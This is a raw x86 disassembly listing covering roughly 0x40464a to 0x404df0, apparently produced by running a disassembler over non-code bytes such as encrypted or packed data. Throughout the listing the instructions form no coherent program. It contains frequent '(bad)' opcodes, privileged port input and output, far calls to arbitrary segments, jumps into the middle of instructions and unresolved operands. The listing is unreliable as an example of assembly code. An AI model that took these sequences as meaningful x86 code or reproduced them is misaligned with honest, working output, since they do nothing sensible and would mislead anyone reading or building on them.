  40464a:	pushf  
  40464b:	dec    esp
  40464c:	jge    0x40465a
  40464e:	ret    0x5f4c
  404651:	inc    edi
  404652:	imul   esi,DWORD PTR ds:0xf223f41c,0x9d648a3
  40465c:	mov    al,ds:0x6f5e7ad5
  404661:	dec    BYTE PTR [ebp-0x12d2107e]
  404667:	sahf   
  404668:	and    eax,DWORD PTR [eax]
  40466a:	push   0xa2950237
  40466f:	or     al,0xf6
  404671:	jb     0x40469e
  404673:	dec    eax
  404674:	outs   dx,BYTE PTR ds:[esi]
  404675:	out    dx,al
  404676:	popf   
  404677:	mov    dl,0xbb
  404679:	in     al,0x2b
  40467b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40467c:	fs xchg ecx,eax
  40467e:	clc    
  40467f:	lahf   
  404680:	and    eax,DWORD PTR [eax-0x1c]
  404683:	jbe    0x404660
  404685:	loope  0x4046f4
  404687:	inc    ebx
  404688:	xchg   esp,eax
  404689:	addr16 push edx
  40468b:	cli    
  40468c:	enter  0x956b,0x94
  404690:	imul   ebx,esp,0xec4e9f89
  404696:	add    eax,0x657e9e69
  40469b:	stos   DWORD PTR es:[edi],eax
  40469c:	std    
  40469d:	outs   dx,DWORD PTR ds:[esi]
  40469e:	(bad)  
  40469f:	inc    eax
  4046a0:	xor    DWORD PTR [edx],eax
  4046a2:	mov    esi,0xcca30116
  4046a7:	xchg   esp,eax
  4046a8:	xlat   BYTE PTR ds:[ebx]
  4046a9:	sbb    BYTE PTR [ebx+ebp*1-0x1e3b9e4d],dh
  4046b0:	jae    0x404652
  4046b2:	mov    cl,0x4a
  4046b4:	mov    bh,0xd
  4046b6:	addr16 out dx,eax
  4046b8:	dec    ebx
  4046b9:	cdq    
  4046ba:	sti    
  4046bb:	les    edx,FWORD PTR [esi-0x5c]
  4046be:	or     DWORD PTR [edi-0x39],ebx
  4046c1:	push   ss
  4046c2:	dec    ebx
  4046c3:	lock loopne 0x40472d
  4046c6:	(bad)  
  4046c7:	stc    
  4046c8:	xchg   ebx,eax
  4046c9:	mov    ebx,0x76d6a781
  4046ce:	push   ds
  4046cf:	cmp    edx,DWORD PTR ds:0xbf06fc66
  4046d5:	sbb    al,0x16
  4046d7:	clc    
  4046d8:	ja     0x40466d
  4046da:	fst    DWORD PTR [ebx+0x14]
  4046dd:	push   edi
  4046de:	les    eax,FWORD PTR [esi]
  4046e0:	inc    ebp
  4046e1:	xchg   edx,eax
  4046e2:	lahf   
  4046e3:	jae    0x404693
  4046e5:	pop    ds
  4046e6:	push   edi
  4046e7:	lahf   
  4046e8:	outs   dx,DWORD PTR ds:[esi]
  4046e9:	ror    BYTE PTR [edx+0x2e],1
  4046ec:	int    0xa3
  4046ee:	xchg   esp,eax
  4046ef:	push   edx
  4046f0:	or     ah,cl
  4046f2:	iret   
  4046f3:	pop    esp
  4046f4:	idiv   BYTE PTR [esi]
  4046f6:	xor    dh,BYTE PTR [ecx]
  4046f8:	add    BYTE PTR [ecx-0x80],ch
  4046fb:	cmp    esi,edx
  4046fd:	mov    cs,WORD PTR [edi-0x65]
  404700:	ins    DWORD PTR es:[edi],dx
  404701:	out    dx,al
  404702:	add    al,0xef
  404704:	int3   
  404705:	gs clc 
  404707:	sbb    eax,0x88f6ff63
  40470c:	out    0x7c,eax
  40470e:	outs   dx,DWORD PTR ds:[esi]
  40470f:	in     al,dx
  404710:	in     eax,dx
  404711:	and    BYTE PTR [ecx+0x40ff2e28],0x15
  404718:	and    ah,BYTE PTR [esp+ebp*1+0x3bb591c5]
  40471f:	inc    esi
  404720:	pushf  
  404721:	xlat   BYTE PTR ds:[ebx]
  404722:	push   ds
  404723:	mov    esi,0x3a07c9ed
  404728:	repz xchg ebx,eax
  40472a:	push   esi
  40472b:	adc    DWORD PTR [eax+0x10],0xfffffffc
  40472f:	bound  edx,QWORD PTR [edx+eax*1-0x31]
  404733:	imul   esi,DWORD PTR [ebp-0xa],0xffffffa1
  404737:	fisttp QWORD PTR [ebx+ebp*1+0x1ea2239e]
  40473e:	or     dh,BYTE PTR [edx]
  404740:	or     BYTE PTR [edx-0x3e7ebb52],ah
  404746:	mov    esp,0x3968cb92
  40474b:	and    BYTE PTR [ebp-0x27679a05],cl
  404751:	dec    esp
  404752:	das    
  404753:	mov    ah,0xdb
  404755:	dec    esi
  404756:	dec    esp
  404757:	loopne 0x404764
  404759:	cmp    al,BYTE PTR [ecx+0x16]
  40475c:	ror    ebp,1
  40475e:	js     0x4046fb
  404760:	xlat   BYTE PTR ds:[ebx]
  404761:	adc    eax,0x4474b2c8
  404766:	adc    bl,0xaa
  404769:	mov    eax,0x3d5d7ef6
  40476e:	pushf  
  40476f:	xchg   esp,eax
  404770:	push   ecx
  404771:	retf   0x53c4
  404774:	xchg   ebp,eax
  404775:	push   edi
  404776:	jmp    0x40478a
  404778:	aaa    
  404779:	mov    esi,0xdc99b1cc
  40477e:	push   esp
  404780:	adc    cl,BYTE PTR [edi+edi*2+0x26]
  404784:	imul   ebx,DWORD PTR [ecx+ecx*4],0x6a
  404788:	push   ss
  404789:	dec    edi
  40478a:	mov    bp,0xdab3
  40478e:	or     edi,DWORD PTR [eax]
  404790:	xchg   ebp,eax
  404791:	sub    eax,0x3021537a
  404796:	(bad)  
  404797:	loop   0x404719
  404799:	jge    0x404763
  40479b:	inc    ebp
  40479c:	lea    esi,[edx-0x34]
  40479f:	das    
  4047a0:	jo     0x40480a
  4047a2:	sbb    ecx,ebp
  4047a4:	out    0x31,al
  4047a6:	rcl    DWORD PTR ds:0x59dfa165,cl
  4047ac:	or     al,0xc6
  4047ae:	repnz dec ebx
  4047b0:	data16 xchg BYTE PTR [edx-0x3d],bh
  4047b4:	ins    BYTE PTR es:[edi],dx
  4047b5:	jae    0x4047a9
  4047b7:	xor    eax,0xb3dadb57
  4047bc:	scas   eax,DWORD PTR es:[edi]
  4047bd:	xchg   ebx,eax
  4047be:	inc    eax
  4047bf:	push   edi
  4047c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047c1:	adc    al,BYTE PTR [edx-0x4544b1]
  4047c7:	cld    
  4047c8:	rcr    BYTE PTR [ebp-0x74],1
  4047cb:	(bad)
  4047ce:	push   es
  4047cf:	inc    edi
  4047d0:	ja     0x404830
  4047d2:	push   esi
  4047d3:	cmp    ecx,ebx
  4047d5:	mov    ecx,0xe0194e0b
  4047da:	cmp    dl,BYTE PTR [edx+0x37]
  4047dd:	es inc esp
  4047df:	clc    
  4047e0:	call   0x923c:0x36b8f996
  4047e7:	nop
  4047e8:	retf   0xad0
  4047eb:	test   DWORD PTR [ecx],edx
  4047ed:	jmp    0xfde3c82d
  4047f2:	inc    eax
  4047f3:	out    0xbc,al
  4047f5:	in     al,dx
  4047f6:	jne    0x404803
  4047f8:	push   cs
  4047f9:	stos   BYTE PTR es:[edi],al
  4047fa:	pop    ds
  4047fb:	cdq    
  4047fc:	fistp  DWORD PTR [esi-0x7b]
  4047ff:	push   es
  404800:	leave  
  404801:	arpl   WORD PTR [eax],si
  404803:	cli    
  404804:	fidivr WORD PTR [esp+ebx*1-0x19c51966]
  40480b:	add    ah,BYTE PTR [ebp-0x7b]
  40480e:	xchg   esp,eax
  40480f:	and    ch,BYTE PTR [ebx-0xa]
  404812:	add    ebx,esp
  404814:	(bad)  
  404815:	dec    ecx
  404816:	push   eax
  404817:	lods   al,BYTE PTR ds:[esi]
  404818:	ss dec esp
  40481a:	xor    bh,bh
  40481c:	add    BYTE PTR [esi-0x6d],ah
  40481f:	addr16 jmp 0x40485c
  404822:	or     eax,0x9e46de15
  404827:	push   cs
  404828:	ja     0x404812
  40482a:	mov    esi,0x9d50e8f
  40482f:	jo     0x404898
  404831:	mov    esp,0x7f3e0ed9
  404836:	inc    esi
  404837:	nop
  404838:	xchg   esp,eax
  404839:	xsaveopt [ebp-0x200b70d6]
  404840:	cmp    eax,0x7b5bba71
  404845:	sbb    eax,0x57b66ed2
  40484a:	xor    ecx,DWORD PTR [ecx-0x2eb0416e]
  404850:	aam    0x5b
  404852:	mov    DWORD PTR [ebp+0x3a],ebp
  404855:	or     BYTE PTR [edi],dh
  404857:	jecxz  0x4047f1
  404859:	mov    al,ds:0xdc332765
  40485e:	mov    dl,0x44
  404860:	(bad)  
  404861:	adc    BYTE PTR [esi-0x5b],ch
  404864:	pop    es
  404865:	adc    al,al
  404867:	sbb    ah,ch
  404869:	imul   eax,esi,0x79a1b045
  40486f:	out    dx,al
  404870:	call   0xf0990f00
  404875:	push   esp
  404876:	lods   eax,DWORD PTR ds:[esi]
  404877:	add    al,0x7c
  404879:	in     eax,dx
  40487a:	sub    edi,0x2
  40487d:	mov    edi,0xae0bb8f7
  404882:	cmp    ecx,DWORD PTR [ebx]
  404884:	test   al,0xef
  404886:	jle    0x4048b6
  404888:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404889:	sbb    BYTE PTR [edx],ah
  40488b:	aad    0x67
  40488d:	(bad)  
  40488e:	mov    ecx,0x4aab4c56
  404893:	clc    
  404894:	sub    edx,DWORD PTR [ebx-0x2c]
  404897:	out    0x3f,al
  404899:	aad    0x31
  40489b:	outs   dx,BYTE PTR ds:[esi]
  40489c:	jbe    0x4048ed
  40489e:	inc    edx
  40489f:	stc    
  4048a0:	sub    eax,0x96f19982
  4048a5:	or     eax,0x7bc4fbe5
  4048aa:	sti    
  4048ab:	dec    edi
  4048ac:	mov    eax,ds:0xf09906
  4048b1:	popa   
  4048b2:	inc    esp
  4048b3:	jl     0x4048ab
  4048b5:	sub    dh,bh
  4048b7:	sub    eax,DWORD PTR [edx+0x3b8690b5]
  4048bd:	sub    eax,0x5eb4cdcb
  4048c2:	sbb    esp,DWORD PTR [edx-0x65]
  4048c5:	les    ecx,FWORD PTR [esp+eiz*4-0x74]
  4048c9:	imul   ecx,edx,0x86396671
  4048cf:	cmp    eax,ecx
  4048d1:	xchg   ebx,eax
  4048d2:	int3   
  4048d3:	pop    esi
  4048d4:	fstp   TBYTE PTR [ebp-0x39]
  4048d7:	mov    dh,0x6
  4048d9:	je     0x404924
  4048db:	xor    ch,BYTE PTR [esi+0x6e]
  4048de:	inc    esi
  4048df:	or     DWORD PTR [ecx+0x2022e38c],esp
  4048e5:	loop   0x4048aa
  4048e7:	cmp    BYTE PTR [ebx],bl
  4048e9:	daa    
  4048ea:	mul    ch
  4048ec:	leave  
  4048ed:	aad    0x65
  4048ef:	mov    ebx,0xbbf59ae1
  4048f4:	stc    
  4048f5:	cmp    DWORD PTR [edi-0x79],eax
  4048f8:	xchg   edi,ecx
  4048fa:	sbb    al,0xaa
  4048fc:	lgdtd  [ebx-0x29bc0d9e]
  404903:	cvtps2pi mm7,QWORD PTR ds:[edi]
  404907:	aaa    
  404908:	sbb    ebx,DWORD PTR [edi+0x78]
  40490b:	mov    esp,DWORD PTR [ebp+0x38]
  40490e:	in     al,0x7a
  404910:	mov    dl,0x5f
  404912:	sbb    al,BYTE PTR [ebp+eax*8+0x325dbcfb]
  404919:	adc    ebx,DWORD PTR [ecx+0x1160c4f7]
  40491f:	mov    ch,dh
  404921:	mov    ebp,0x22a3c1f1
  404926:	adc    ah,BYTE PTR [edx]
  404928:	adc    BYTE PTR [ecx-0x7b],ah
  40492b:	push   esi
  40492c:	hlt    
  40492d:	ficom  DWORD PTR [eax+0x56]
  404930:	fimul  WORD PTR [esi-0xc325f85]
  404936:	mov    dh,0x80
  404938:	push   edx
  404939:	lods   al,BYTE PTR ds:[esi]
  40493a:	push   ecx
  40493b:	cwde   
  40493c:	sub    ebp,DWORD PTR [ecx+0x61]
  40493f:	aad    0xfa
  404941:	inc    esi
  404942:	inc    esi
  404943:	sub    ah,BYTE PTR [edi+ebx*1]
  404946:	adc    cl,BYTE PTR [ebx]
  404948:	int    0x70
  40494a:	mov    cl,0xb9
  40494c:	mov    DWORD PTR [edx+ebx*2+0x357aae47],ebp
  404953:	pop    ds
  404954:	aad    0x9c
  404956:	xchg   ecx,eax
  404957:	mov    eax,ds:0x254bf40f
  40495c:	in     al,0x5e
  40495e:	add    edi,0xffffffad
  404961:	lds    edx,FWORD PTR [ebx-0x641b5c83]
  404967:	push   edi
  404968:	jp     0x4048ee
  40496a:	out    0x81,eax
  40496c:	dec    ebx
  40496d:	jecxz  0x4049af
  40496f:	sbb    BYTE PTR [ebx-0xdee46ab],0xdd
  404976:	push   0xffffff82
  404978:	jbe    0x40496a
  40497a:	mov    ecx,0xd562f96d
  40497f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404980:	mov    ebp,0x98dea2f2
  404985:	mov    dl,0x50
  404987:	push   ds
  404988:	addr16 ja 0x4049a5
  40498b:	mov    dl,0x48
  40498d:	pop    esi
  40498e:	in     al,dx
  40498f:	rcr    BYTE PTR [eax-0x62ffe19a],0x2e
  404996:	push   ss
  404997:	jg     0x4049a2
  404999:	dec    ecx
  40499a:	in     al,dx
  40499b:	or     eax,0x3cc09542
  4049a0:	icebp  
  4049a1:	push   ebx
  4049a2:	xlat   BYTE PTR ds:[ebx]
  4049a3:	pop    eax
  4049a4:	sbb    eax,0xd93d385f
  4049a9:	xchg   ecx,eax
  4049aa:	and    BYTE PTR ds:0xd1f699ce,ch
  4049b0:	and    esi,esp
  4049b2:	je     0x404a12
  4049b4:	loopne 0x404993
  4049b6:	test   al,0x8f
  4049b8:	in     al,dx
  4049b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049ba:	pop    es
  4049bb:	dec    eax
  4049bc:	mov    dl,0xc0
  4049be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049bf:	add    ch,0xc4
  4049c2:	stos   DWORD PTR es:[edi],eax
  4049c3:	stc    
  4049c4:	xor    ebx,DWORD PTR ds:0xe0e6e485
  4049ca:	in     al,dx
  4049cb:	mov    eax,edi
  4049cd:	test   eax,0xd0761dd3
  4049d2:	xor    DWORD PTR [ebp+ebx*1-0x2dcf4774],edi
  4049d9:	xchg   ecx,eax
  4049da:	call   0x2be82d6f
  4049df:	out    dx,eax
  4049e0:	mov    dl,0x1d
  4049e2:	inc    edi
  4049e3:	enter  0x4f6a,0xd8
  4049e7:	pusha  
  4049e8:	xor    BYTE PTR [edi+ebx*8+0x15],dh
  4049ec:	cwde   
  4049ed:	dec    edi
  4049ee:	pop    esp
  4049ef:	dec    ebx
  4049f0:	imul   eax,DWORD PTR ds:0xa2309f2c,0x6f
  4049f7:	push   0xffffff9d
  4049f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049fa:	dec    ecx
  4049fb:	mov    al,ds:0x62da4dc8
  404a00:	ret    0x7c06
  404a03:	push   0xff355589
  404a08:	or     BYTE PTR [edx+0x44],cl
  404a0b:	jne    0x404a0d
  404a0d:	lods   al,BYTE PTR ds:[esi]
  404a0e:	lock ss add bh,dh
  404a12:	mov    cs,WORD PTR [esi]
  404a14:	jo     0x4049e4
  404a16:	fisttp DWORD PTR [bp+si-0x58]
  404a1a:	and    DWORD PTR [ecx+esi*2],esp
  404a1d:	add    edi,DWORD PTR [ecx-0x5efc2b71]
  404a23:	pop    ss
  404a24:	jb     0x4049aa
  404a26:	les    eax,FWORD PTR [eax]
  404a28:	mov    ecx,DWORD PTR [esi]
  404a2a:	dec    eax
  404a2b:	outs   dx,BYTE PTR ds:[esi]
  404a2c:	rol    DWORD PTR [edx],0x6c
  404a2f:	sete   BYTE PTR [ecx]
  404a32:	outs   dx,DWORD PTR ds:[esi]
  404a33:	push   edi
  404a34:	mov    ds:0x9246eb0b,eax
  404a39:	jp     0x4049cf
  404a3b:	mov    ds:0x57a4b149,al
  404a40:	cmc    
  404a41:	jp     0x404a66
  404a43:	loop   0x404a22
  404a45:	dec    edi
  404a46:	je     0x404ab5
  404a48:	icebp  
  404a49:	test   DWORD PTR [ebp+0x57],ecx
  404a4c:	and    al,0xa0
  404a4e:	add    al,BYTE PTR [ebp+0x5442fdb9]
  404a54:	mov    ah,0x60
  404a56:	mov    esp,0x8394af45
  404a5b:	mov    al,ds:0xa5022ec8
  404a60:	ret    
  404a61:	pop    esp
  404a62:	inc    esp
  404a63:	push   es
  404a64:	xor    DWORD PTR [esi+0x4c1ac99a],eax
  404a6a:	mov    eax,ds:0xf5e1ec12
  404a6f:	ss sub eax,0x596e1334
  404a75:	repnz mov ds:0xc319f67,al
  404a7b:	test   BYTE PTR [eax-0x6dbf47],cl
  404a81:	stc    
  404a82:	pop    ss
  404a83:	mov    esi,0x1b258783
  404a88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a89:	mov    ebx,0x776a86a4
  404a8e:	mov    edx,0xacd5b397
  404a93:	mov    BYTE PTR [edx],ch
  404a95:	je     0x404a86
  404a97:	adc    esi,DWORD PTR [ecx+0x716a81dd]
  404a9d:	push   0xa140c710
  404aa2:	pop    eax
  404aa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404aa4:	and    BYTE PTR [edx],0xcd
  404aa7:	add    BYTE PTR [esi+0x5c],bh
  404aaa:	cmp    BYTE PTR [eax-0x46e053a6],0x20
  404ab1:	and    al,ah
  404ab3:	(bad)  
  404ab4:	rcr    DWORD PTR [eax+0x3b],cl
  404ab7:	out    dx,al
  404ab8:	pushf  
  404ab9:	gs mov bh,0x2
  404abc:	mov    WORD PTR [ebp+0x39a83f09],ss
  404ac2:	mov    ecx,0x3878d09
  404ac7:	jno    0x404a88
  404ac9:	inc    eax
  404aca:	adc    al,0x8
  404acc:	shl    DWORD PTR [edi],0x58
  404acf:	pop    es
  404ad0:	or     dl,BYTE PTR [esi-0x37]
  404ad3:	enter  0x588d,0x85
  404ad7:	ss jnp 0x404b51
  404ada:	adc    ebx,DWORD PTR ds:[ebp+0x38]
  404ade:	jae    0x404b06
  404ae0:	adc    BYTE PTR [ecx+edx*1+0xa53ab07],0x16
  404ae8:	nop
  404ae9:	add    DWORD PTR [esi+0x439aee9c],esi
  404aef:	xchg   edx,eax
  404af0:	cmp    BYTE PTR [edi-0x27977c05],cl
  404af6:	mov    cl,0x8e
  404af8:	(bad)  
  404af9:	enter  0xaeaf,0xf8
  404afd:	inc    eax
  404afe:	or     dh,al
  404b00:	dec    edi
  404b01:	and    eax,0x3db7824a
  404b06:	pop    edx
  404b07:	cmp    edi,edx
  404b09:	sbb    DWORD PTR [ebp-0x3432c1d6],ebx
  404b0f:	mov    bh,0x1b
  404b11:	comiss xmm3,DWORD PTR [ebp-0x2c]
  404b15:	shl    DWORD PTR [ecx-0x22e28a44],1
  404b1b:	cmp    al,0x40
  404b1d:	push   eax
  404b1e:	out    0xf3,al
  404b20:	jno    0x404b2c
  404b22:	fstp   TBYTE PTR [eax]
  404b24:	stos   BYTE PTR es:[edi],al
  404b25:	cmp    eax,edx
  404b27:	dec    edi
  404b28:	inc    esp
  404b29:	fild   DWORD PTR [esi+esi*4+0x7830c712]
  404b30:	lock sub ebp,DWORD PTR [eax-0x44]
  404b34:	pushf  
  404b35:	mov    al,0xe1
  404b37:	cli    
  404b38:	xlat   BYTE PTR ds:[ebx]
  404b39:	mov    al,ds:0x841951db
  404b3e:	and    al,0x9f
  404b40:	(bad)  
  404b42:	fcomp  DWORD PTR [ecx-0x3f4ce9e1]
  404b48:	imul   edi,DWORD PTR [ecx],0x2d3b38a3
  404b4e:	lods   eax,DWORD PTR ds:[esi]
  404b4f:	mov    ch,0xa9
  404b51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b52:	push   ds
  404b53:	or     BYTE PTR [edx-0x37],cl
  404b56:	and    eax,0x40a1896e
  404b5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b5c:	push   eax
  404b5d:	sti    
  404b5e:	push   ds
  404b5f:	in     eax,dx
  404b60:	push   ds
  404b61:	movlps QWORD PTR [edi+0x61],xmm0
  404b65:	mov    ebx,0xc7a100ad
  404b6a:	out    dx,al
  404b6b:	fstp   st(6)
  404b6d:	js     0x404b91
  404b6f:	rcr    al,cl
  404b71:	adc    BYTE PTR [edi+0x3ea2a8e6],bl
  404b77:	out    dx,eax
  404b78:	push   ss
  404b79:	push   ss
  404b7a:	inc    esp
  404b7b:	push   ebp
  404b7c:	loopne 0x404b4d
  404b7e:	jge    0x404bc5
  404b80:	loopne 0x404bc8
  404b82:	xor    DWORD PTR [edi],0xf1436e90
  404b88:	out    dx,al
  404b89:	mov    dh,0x59
  404b8b:	inc    ebp
  404b8c:	xchg   BYTE PTR [esi+0x3d54f299],ch
  404b92:	pop    ebp
  404b93:	xchg   BYTE PTR [ebx-0x2],ah
  404b96:	jnp    0x404b4b
  404b98:	pop    ds
  404b99:	das    
  404b9a:	mov    cl,0x7c
  404b9c:	fimul  WORD PTR [esi-0x20ddc79a]
  404ba2:	loope  0x404bbb
  404ba4:	push   0x76c1b677
  404ba9:	(bad)  
  404baa:	idiv   BYTE PTR [bx+di]
  404bad:	or     al,0x4c
  404baf:	jecxz  0x404b9b
  404bb1:	das    
  404bb2:	mov    fs,WORD PTR [esi+0x67]
  404bb5:	xchg   esi,eax
  404bb6:	mov    DWORD PTR [eax],ebp
  404bb8:	daa    
  404bb9:	das    
  404bba:	retf   
  404bbb:	jbe    0x404bd7
  404bbd:	test   BYTE PTR [edx],bl
  404bbf:	pop    ecx
  404bc0:	cld    
  404bc1:	sbb    eax,0xbc6c6796
  404bc6:	pushf  
  404bc7:	mov    eax,ds:0xbabf222c
  404bcc:	push   eax
  404bcd:	ret    
  404bce:	dec    eax
  404bcf:	(bad)  
  404bd1:	inc    ecx
  404bd2:	sti    
  404bd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bd4:	inc    ebx
  404bd5:	dec    esi
  404bd6:	gs jno 0x404c13
  404bd9:	mov    WORD PTR [ebp+0x2725fefe],ds
  404bdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404be0:	add    DWORD PTR ds:0x2566d43,0xd5cea89f
  404bea:	fs in  al,0xfb
  404bed:	mov    dl,dh
  404bef:	sar    BYTE PTR [edi],1
  404bf1:	mov    eax,DWORD PTR [ebx-0x56149011]
  404bf7:	xor    al,0x2f
  404bf9:	mov    al,0xbf
  404bfb:	fistp  WORD PTR [edx-0x39]
  404bfe:	lods   eax,DWORD PTR ds:[esi]
  404bff:	hlt    
  404c00:	outs   dx,BYTE PTR ds:[esi]
  404c01:	add    al,0x54
  404c03:	mov    esp,0x3ac6afdb
  404c08:	xchg   DWORD PTR [esi+0x7bb8975b],ecx
  404c0e:	ret    0x8bdf
  404c11:	push   ebp
  404c12:	les    edx,FWORD PTR [ebx]
  404c14:	lds    ebx,FWORD PTR [ecx-0x49ee4192]
  404c1a:	jns    0x404c42
  404c1c:	imul   edx,esi,0x2
  404c1f:	enter  0x1b6f,0x78
  404c23:	retf   
  404c24:	imul   eax,esi,0x7820dc9e
  404c2a:	xchg   DWORD PTR [eax],eax
  404c2c:	dec    ecx
  404c2d:	jae    0x404bf5
  404c2f:	mov    edx,0x6293bf7
  404c34:	mov    ?,WORD PTR ds:0xe9a5eaef
  404c3a:	or     eax,0x5dc9f21f
  404c3f:	icebp  
  404c40:	call   0x5299:0x153bb53d
  404c47:	mov    edx,0xce310362
  404c4c:	add    al,0x11
  404c4e:	fistp  WORD PTR [esi-0x63]
  404c51:	jnp    0x404c28
  404c53:	cld    
  404c54:	pusha  
  404c55:	mov    dl,0xb2
  404c57:	mov    BYTE PTR [edx-0xdb4503b],0x7f
  404c5e:	ror    BYTE PTR [ebp-0x799b09a],1
  404c64:	add    eax,0x19802b1f
  404c69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c6a:	mov    edi,0x9e943ca7
  404c6f:	ret    0x80c6
  404c72:	fisttp DWORD PTR [edx-0x14]
  404c75:	mov    ebx,edi
  404c77:	adc    eax,0xf6c5044c
  404c7c:	push   ebp
  404c7d:	stc    
  404c7e:	icebp  
  404c7f:	sar    BYTE PTR [ecx+ebx*1-0x626ec66],1
  404c86:	and    BYTE PTR [edi+0x2c34a9a7],0xed
  404c8d:	adc    ecx,DWORD PTR [edi-0x215cb4dc]
  404c93:	xor    eax,0x355ffdf2
  404c98:	push   0x8a238805
  404c9d:	push   0x11
  404c9f:	mov    ds:0x92366a2c,al
  404ca4:	push   ebx
  404ca5:	pop    eax
  404ca6:	(bad)  
  404ca7:	bound  ecx,QWORD PTR [ebx-0x33]
  404caa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cab:	jo     0x404c87
  404cad:	sub    bl,ah
  404caf:	sar    DWORD PTR [esi],1
  404cb1:	cli    
  404cb2:	xchg   ebp,eax
  404cb3:	stc    
  404cb4:	or     BYTE PTR [esi],dl
  404cb6:	xchg   ecx,eax
  404cb7:	aam    0xba
  404cb9:	test   al,0xb4
  404cbb:	out    0x0,al
  404cbd:	loopne 0x404d30
  404cbf:	mov    eax,0xdcf32ed2
  404cc4:	enter  0xeabc,0x4e
  404cc8:	sub    ch,ah
  404cca:	sbb    ecx,DWORD PTR [ecx-0x5e]
  404ccd:	mov    ah,cl
  404ccf:	mov    ecx,0xf6c2ddc5
  404cd4:	mov    al,0xb8
  404cd6:	mov    bl,bh
  404cd8:	pop    ecx
  404cd9:	arpl   WORD PTR [edx-0x34],di
  404cdc:	ins    DWORD PTR es:[edi],dx
  404cdd:	loopne 0x404c83
  404cdf:	mov    esp,0x6bb6247
  404ce4:	xchg   edx,eax
  404ce5:	fsubr  QWORD PTR [ebx+0x7f]
  404ce8:	push   ebp
  404ce9:	loop   0x404cc3
  404ceb:	dec    esi
  404cec:	call   0x672e:0x33bc387
  404cf3:	cmp    BYTE PTR [ecx],ch
  404cf5:	aam    0x92
  404cf7:	cwde   
  404cf8:	scas   eax,DWORD PTR es:[edi]
  404cf9:	rcr    BYTE PTR [ebp+0x6138cbdd],1
  404cff:	sub    eax,0xf65200ac
  404d04:	sahf   
  404d05:	jmp    0xeeb8f4c7
  404d0a:	add    ecx,DWORD PTR [edi+0x1c]
  404d0d:	push   ds
  404d0e:	(bad)  
  404d0f:	lahf   
  404d10:	shl    DWORD PTR [esi-0x443713b6],0x32
  404d17:	enter  0x2525,0x35
  404d1b:	mov    edi,DWORD PTR [ecx-0x2a278ec0]
  404d21:	lock ds scas al,BYTE PTR es:[edi]
  404d24:	sbb    DWORD PTR [eax],edi
  404d26:	jb     0x404d51
  404d28:	dec    edi
  404d29:	stc    
  404d2a:	out    0x68,al
  404d2c:	retf   
  404d2d:	mov    edx,0x59e240ae
  404d32:	add    BYTE PTR [ebx-0x796c6ea9],dh
  404d38:	mov    edi,0xf10916ef
  404d3d:	xor    ah,BYTE PTR [ebp+0x1ca0bf52]
  404d43:	push   0xfffffff3
  404d45:	cmp    BYTE PTR [esi-0x65],dl
  404d48:	ds mov bh,0xd1
  404d4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d4c:	es xchg ebp,eax
  404d4e:	adc    al,0x3
  404d50:	mov    ?,WORD PTR [ebx-0x1f17dcd0]
  404d56:	outs   dx,BYTE PTR ds:[esi]
  404d57:	leave  
  404d58:	xchg   DWORD PTR [ebx+edx*8],esi
  404d5b:	cmp    al,0xdd
  404d5d:	popa   
  404d5e:	lods   eax,DWORD PTR ds:[esi]
  404d5f:	stos   BYTE PTR es:[edi],al
  404d60:	adc    edx,DWORD PTR [ecx-0x6c]
  404d63:	leave  
  404d64:	retf   0x992a
  404d67:	pop    edx
  404d68:	pop    esp
  404d69:	iret   
  404d6a:	int3   
  404d6b:	test   BYTE PTR [ecx-0x6],bl
  404d6e:	aad    0x7b
  404d70:	xlat   BYTE PTR ds:[ebx]
  404d71:	pop    ds
  404d72:	inc    ebx
  404d73:	stc    
  404d74:	lods   al,BYTE PTR ds:[esi]
  404d75:	jb     0x404dde
  404d77:	fidiv  WORD PTR [ecx]
  404d79:	xor    bh,BYTE PTR [esp+eiz*2+0x5714a3a0]
  404d80:	dec    edi
  404d81:	xor    esp,DWORD PTR [edx]
  404d83:	imul   esi,ebx,0xf54a0442
  404d89:	xor    eax,0xa6760e3e
  404d8e:	mov    WORD PTR [eax-0x57],?
  404d91:	fs xchg edx,eax
  404d93:	jo     0x404d23
  404d95:	fadd   QWORD PTR [esi-0x4f2ec895]
  404d9b:	mov    cl,dl
  404d9d:	inc    eax
  404d9e:	lock lock mov es,WORD PTR [ebx]
  404da2:	pop    ss
  404da3:	(bad)  
  404da4:	mov    cl,0x5e
  404da6:	enter  0x2132,0xd2
  404daa:	loop   0x404e05
  404dac:	out    0x45,eax
  404dae:	dec    ebp
  404daf:	enter  0xe8fc,0xfb
  404db3:	dec    ecx
  404db4:	mov    DWORD PTR ds:0xe35b7582,ebx
  404dba:	lods   eax,DWORD PTR ds:[esi]
  404dbb:	stos   BYTE PTR es:[edi],al
  404dbc:	xchg   esi,eax
  404dbd:	xor    DWORD PTR ds:0xb251c38e,ecx
  404dc3:	ss mov ch,0x5d
  404dc6:	mov    eax,ds:0x99be216e
  404dcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404dcc:	repz jbe 0x404d54
  404dcf:	cs ins BYTE PTR es:[edi],dx
  404dd1:	jo     0x404e4f
  404dd3:	jecxz  0x404dfb
  404dd5:	xchg   ebx,eax
  404dd7:	pop    edi
  404dd8:	mov    dh,0x20
  404dda:	test   BYTE PTR [eax-0x64],dh
  404ddd:	jg     0x404d91
  404ddf:	mov    cl,0x4a
  404de1:	xor    eax,0xb01da16e
  404de6:	clc    
  404de7:	inc    ecx
  404de8:	mov    DWORD PTR [edi],esi
  404dea:	jecxz  0x404d8f
  404dec:	jns    0x404d71
  404dee:	mov    dh,0x3
  404df0:	sub    BYTE PTR [ecx],0x57
